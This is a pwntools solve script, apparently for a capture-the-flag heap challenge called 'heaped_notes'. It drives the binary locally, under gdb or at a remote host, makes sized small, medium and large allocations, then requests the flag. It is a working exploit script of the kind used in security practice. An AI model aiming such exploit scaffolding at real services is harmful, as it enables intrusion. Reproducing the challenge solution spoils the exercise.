from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def small(size, data=None):
    io.sendline(b"small")
    io.sendline(str(size).encode())
    if data != None:
        io.sendline(data)


def medium(size, data=None):
    io.sendline(b"medium")
    io.sendline(str(size).encode())
    if data != None:
        io.sendline(data)


def large(size, data=None):
    io.sendline(b"large")
    io.sendline(str(size).encode())
    if data != None:
        io.sendline(data)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./heaped_notes"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()

small(31, b"aaaa")
small(33)
medium(31, b"aaaa")
medium(65)
large(31, b"aaaa")
large(129)

io.sendline(b"flag")

io.interactive()
